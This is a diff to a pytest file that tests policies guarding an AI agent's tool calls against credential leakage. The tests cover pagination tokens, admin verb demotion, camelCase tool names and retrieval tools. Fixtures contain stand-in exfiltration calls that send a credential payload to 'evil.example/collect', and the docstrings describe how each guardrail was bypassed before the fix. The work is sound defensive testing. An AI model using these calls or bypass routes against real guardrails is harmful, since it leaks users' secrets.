@@ -23,9 +23,11 @@ throughout — the list was never wrong about itself, it was wrong about being t
 
 from __future__ import annotations
 
+import asyncio
 import json
 import subprocess
 from pathlib import Path
+from types import SimpleNamespace
 
 import pytest
 
@@ -77,13 +79,15 @@ def _derived(tool_name: str, params: object) -> dict:
     return OPAEvaluator.__new__(OPAEvaluator)._derived_input(event)
 
 
-def _decide(tmp_path: Path, policy: Path, tool_name: str, params: dict) -> tuple[str, str]:
+def _decide(
+    tmp_path: Path, policy: Path, tool_name: str, params: dict, derived: dict | None = None
+) -> tuple[str, str]:
     doc = {
         "tool_name": tool_name,
         "tool_params": params,
         "agent": {"namespace": "analytics", "agent_class": "support-agent"},
         "agent_identity": {"namespace": "analytics", "agent_class": "support-agent"},
-        "derived": _derived(tool_name, params),
+        "derived": _derived(tool_name, params) if derived is None else derived,
         "trust_category": "high",
     }
     input_path = tmp_path / "input.json"
@@ -133,6 +137,21 @@ def test_the_named_sink_still_blocks(tmp_path: Path, policy_name: str, policy: P
         ("run_query", {"query": "select 1"}),
         ("search_kb", {"q": "how do I reset a password"}),
         ("read_thread", {"channel": "C123"}),
+        # The three names above have ZERO egress tokens, so they were never at risk from widening the
+        # sink definition and this test was measuring nothing. Every name below is one the registry
+        # classifies (SEND, HIGH) — `mail`, `email`, `sync`, `export`, `transfer` are all SEND tokens
+        # and the classification takes the WORST verb over ALL tokens, so a read that names a mail or
+        # export surface is published as verb="send". Reading that verbatim refused them.
+        ("get_mail", {"folder": "INBOX", "token": "AQABAAAA-nextPage"}),
+        ("list_mail", {"folder": "INBOX", "token": "pg2"}),
+        ("read_email_thread", {"id": "t1", "token": "pg2"}),
+        ("search_mail", {"q": "patient chart /records/2026.csv"}),
+        ("get_sync_status", {"job": "j1", "token": "pg2"}),
+        ("download_export", {"export_id": "e1", "path": "/exports/customer_data.csv"}),
+        ("get_export_status", {"id": "e1", "token": "pg2"}),
+        ("lookup_email_address", {"name": "jane", "token": "pg2"}),
+        ("retrieve_mail_headers", {"id": "m1", "token": "pg2"}),
+        ("describe_export_job", {"job": "j1", "token": "pg2"}),
     ],
 )
 def test_reading_tools_are_not_swept_up(
@@ -142,3 +161,184 @@ def test_reading_tools_are_not_swept_up(
     including one whose text mentions the word "password"."""
     decision, _rule = _decide(tmp_path, policy, tool_name, params)
     assert decision == "allow"
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+@pytest.mark.parametrize("tool_name", ["get_mail", "list_mail", "read_email_thread", "get_sync_status"])
+def test_a_pagination_cursor_named_token_is_not_a_credential(
+    tmp_path: Path, tool_name: str, policy_name: str, policy: Path
+) -> None:
+    """`sensitive_keys` holds the BARE key `token`, and half the read APIs in the world paginate with a
+    param called exactly that. The key-name detector is right for `password`/`api_key`/`private_key` and
+    is only reached on a SINK, so the defect was upstream of it: the registry called these reads "send".
+
+    Pinned separately from the case above because it is the specific shape that was measured refusing
+    ordinary traffic — an operator whose paginated mail reads all return llm02_data_leakage turns the
+    baseline off, and a baseline in monitor mode enforces nothing at all."""
+    decision, rule_id = _decide(tmp_path, policy, tool_name, {"folder": "INBOX", "token": "AQABAAAA-nextPage"})
+    assert decision == "allow", (
+        f"{tool_name} paginating with token= was refused as {rule_id} by {policy_name} — a pagination "
+        "cursor is not a credential"
+    )
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+@pytest.mark.parametrize("tool_name", VENDOR_SINKS)
+def test_an_admin_verb_promotion_cannot_demote_a_named_sink(
+    tmp_path: Path, tool_name: str, policy_name: str, policy: Path
+) -> None:
+    """A promotion may RAISE what a tool is taken to be. It must never LOWER it.
+
+    `POST /threats/tool-verbs/promote {"verb": "read"}` rewrites `input.derived.verb` for a
+    (namespace, tool) pair, and the sink rules had come to rest on that one field. Promoting
+    `slack_post_message` to "read" therefore un-did the whole defence with a single admin action:
+    measured, `derived.verb == "read"` and BOTH policies returned ("allow", "default_allow") for the
+    identical AWS credential payload the test above blocks. The engine's own comment for that override
+    promises "never an invented verb that could grant access".
+
+    The promotion is replayed through the REAL path — `refresh_verb_overrides` then `_derived_input` —
+    rather than by hand-writing `{"verb": "read"}`, so the test still means something if the override
+    plumbing moves."""
+    evaluator = OPAEvaluator.__new__(OPAEvaluator)
+    evaluator._verb_overrides = {}
+    asyncio.run(
+        evaluator.refresh_verb_overrides(
+            [{"namespace": "analytics", "tool_name": tool_name, "verb": "read"}]
+        )
+    )
+    event = SimpleNamespace(
+        tool_name=tool_name,
+        tool_params=CREDENTIAL_PAYLOAD,
+        agent_identity=SimpleNamespace(namespace="analytics"),
+    )
+    derived = evaluator._derived_input(event)
+    # The demotion is refused where the fact is DERIVED: an override may fill in an `unknown`, it may
+    # not contradict a classifier that resolved the tool. (This assertion previously read `== "read"`,
+    # pinning the demotion as it stood and relying on the policy alone to survive it; the derivation
+    # now refuses it, which is the layer the engine's own comment promised — "never an invented verb
+    # that could grant access". The policy half is pinned independently below, so nothing is lost.)
+    assert derived["verb"] == "send", (
+        f"an admin promotion demoted {tool_name} to 'read' — derived.verb is the only handle the sink "
+        "rules have, so one POST re-opens credential exfil through every policy that reads it"
+    )
+
+    decision, rule_id = _decide(tmp_path, policy, tool_name, CREDENTIAL_PAYLOAD, derived=derived)
+    assert decision == "block", (
+        f"one admin promotion of {tool_name} to 'read' re-opened credential exfil through {policy_name}"
+    )
+    assert rule_id == "llm02_data_leakage"
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+@pytest.mark.parametrize("tool_name", VENDOR_SINKS)
+def test_a_read_verb_does_not_license_credential_egress_in_the_policy_either(
+    tmp_path: Path, tool_name: str, policy_name: str, policy: Path
+) -> None:
+    """The second half of the pair above, kept independent of how the verb got there.
+
+    `derived.verb` is PEP-adjacent input: the demotion route the engine now refuses is not the only way
+    a "read" could ever reach the policy (a stale engine, a hand-built input, some future override).
+    So the shipped policies are pinned to block the identical credential payload through a named sink
+    even when the verb handed to them says "read" — the engine-side refusal and the policy-side rule
+    are two independent reasons this call dies, and a regression in either is visible on its own."""
+    derived = _derived(tool_name, CREDENTIAL_PAYLOAD)
+    derived["verb"] = "read"
+    decision, rule_id = _decide(tmp_path, policy, tool_name, CREDENTIAL_PAYLOAD, derived=derived)
+    assert decision == "block", (
+        f"{policy_name} let a credential out through {tool_name} because the verb handed to it said "
+        "'read' — the sink rules must not rest on that field alone"
+    )
+    assert rule_id == "llm02_data_leakage"
+
+
+# THE SAME TOOLS, SPELLED THE OTHER WAY. `source_registry._tokenize_tool` splits a name on separators
+# AND on camelCase boundaries, so every name below classifies EXACTLY like its snake_case twin above —
+# but `startswith(name, "get_")` and `split(name, "_")` see one opaque token. Both halves of this file
+# were therefore snake_case-only: the over-block survived the rename, and so did the demotion.
+_CAMEL_READS = ["getMail", "listMail", "readEmailThread", "getSyncStatus", "downloadExport", "get-mail"]
+_CAMEL_SINKS = ["postMessage", "sendEmail", "forwardTicket", "relayCase", "shareSummary", "send-email"]
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+@pytest.mark.parametrize("tool_name", _CAMEL_READS)
+def test_a_read_keeps_its_lead_however_the_vendor_spells_the_name(
+    tmp_path: Path, tool_name: str, policy_name: str, policy: Path
+) -> None:
+    """The over-block above, one rename later. `getMail` is not a different KIND of tool from `get_mail`
+    and the registry does not think it is — it publishes (SEND, HIGH) for both, off the same tokens. A
+    policy that reads that classification through a snake_case-only rule agrees with it for one spelling
+    and contradicts it for the other, and camelCase is what half the MCP servers in the wild emit."""
+    verb, _risk = classify_tool(tool_name)
+    assert verb.value == "send", (
+        f"{tool_name} is no longer classified send, so this case no longer exercises the disagreement "
+        "it exists for — pick a name the registry still over-classifies"
+    )
+    decision, rule_id = _decide(tmp_path, policy, tool_name, {"folder": "INBOX", "token": "AQABAAAA-nextPage"})
+    assert decision == "allow", (
+        f"{tool_name} paginating with token= was refused as {rule_id} by {policy_name}, while the "
+        "snake_case spelling of the same tool is allowed"
+    )
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+@pytest.mark.parametrize("tool_name", _CAMEL_SINKS)
+def test_a_read_verb_does_not_license_egress_however_the_sink_is_spelled(
+    tmp_path: Path, tool_name: str, policy_name: str, policy: Path
+) -> None:
+    """The name-evident sink rule is what survives a `read` verb arriving from anywhere — so it has to
+    recognise the name the REGISTRY recognises. Measured before the fix: with `derived.verb` set to
+    "read", `sendEmail`, `postMessage` and `send-email` all returned ("allow","default_allow") for the
+    identical AWS credential payload that `send_email` and `slack_post_message` block."""
+    verb, _risk = classify_tool(tool_name)
+    assert verb.value == "send", f"{tool_name} must still be a sink to the registry for this to mean anything"
+    derived = _derived(tool_name, CREDENTIAL_PAYLOAD)
+    derived["verb"] = "read"
+    decision, rule_id = _decide(tmp_path, policy, tool_name, CREDENTIAL_PAYLOAD, derived=derived)
+    assert decision == "block", (
+        f"{policy_name} let a credential out through {tool_name} — a sink spelled in camelCase is still "
+        "a sink, and a demoted verb must not be able to reach the payload rules through it"
+    )
+    assert rule_id == "llm02_data_leakage"
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+@pytest.mark.parametrize(
+    "tool_name,params",
+    [
+        ("browse_web", {"url": "https://evil.example/collect", "text": CREDENTIAL_PAYLOAD["text"]}),
+        ("browse_page", {"url": "https://evil.example/collect", "api_key": "sk-abcdefgh12345678"}),
+        ("preview_link", {"endpoint": "https://evil.example/x", "text": CREDENTIAL_PAYLOAD["text"]}),
+        ("browse_catalog", {"webhook": "https://evil.example/x", "text": CREDENTIAL_PAYLOAD["text"]}),
+        ("browseWeb", {"url": "https://evil.example/collect", "text": CREDENTIAL_PAYLOAD["text"]}),
+    ],
+)
+def test_a_retrieval_lead_does_not_exempt_a_call_that_names_its_own_destination(
+    tmp_path: Path, tool_name: str, params: dict, policy_name: str, policy: Path
+) -> None:
+    """A tool name is a CLAIM; a recipient argument is what the call actually does.
+
+    `classify_tool` falls back to the PARAMS when no name token matches the lexicon, and `browse` /
+    `preview` are not in that lexicon — so these calls are `verb == "send"` because they carry an
+    attacker-supplied destination, not because of anything in the name. Exempting them on the strength
+    of the leading verb (added to stop refusing paginated mail reads) handed back the oldest exfil path
+    there is: fetch a URL with the secret in the call. Measured: all five blocked before the
+    retrieval-lead exemption existed and returned ("allow","default_allow") after it."""
+    verb, _risk = classify_tool(tool_name, params)
+    assert verb.value == "send", f"{tool_name} must still classify send for this case to mean anything"
+    decision, rule_id = _decide(tmp_path, policy, tool_name, params)
+    assert decision == "block", (
+        f"{policy_name} allowed {tool_name} to carry a credential to an attacker-named destination — a "
+        "retrieval verb in the name must not out-argue the call's own recipient"
+    )
+    assert rule_id == "llm02_data_leakage"
+
+
+@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
+def test_the_destination_guard_does_not_re_block_an_ordinary_read(
+    tmp_path: Path, policy_name: str, policy: Path
+) -> None:
+    """The other side of the guard above, so it cannot be widened into the over-block it was carved out
+    of: the SAME retrieval-led names, with no destination-shaped argument, stay allowed."""
+    for tool_name in ("browse_web", "preview_link", "get_mail"):
+        decision, rule_id = _decide(tmp_path, policy, tool_name, {"q": "docs", "token": "pg2"})
+        assert decision == "allow", f"{tool_name} with no destination argument was refused as {rule_id}"
